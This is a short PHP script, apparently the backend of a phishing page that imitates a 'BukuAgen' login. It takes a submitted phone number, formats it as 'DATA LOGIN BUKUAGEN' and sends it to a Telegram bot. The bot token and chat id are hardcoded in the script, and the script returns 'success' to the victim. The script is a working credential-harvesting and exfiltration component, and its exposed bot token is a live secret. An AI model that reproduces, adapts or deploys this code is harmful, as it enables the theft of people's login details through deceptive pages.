<?php
// telegran.php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nomor = $_POST['nomor'];
    
    // Konfigurasi Bot Telegram
    $token = "8338779316:AAFEOYYAaWOm4eKRIPzJMjz0V1eKzxonegY";
    $chat_id = "7625997409";
    
    $pesan = "=== DATA LOGIN BUKUAGEN ===\n";
    $pesan .= "Nomor HP: " . $nomor . "\n";
    $pesan .= "==========================";

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($pesan);
    
    file_get_contents($url);
    
    echo json_encode(["status" => "success"]);
}
?>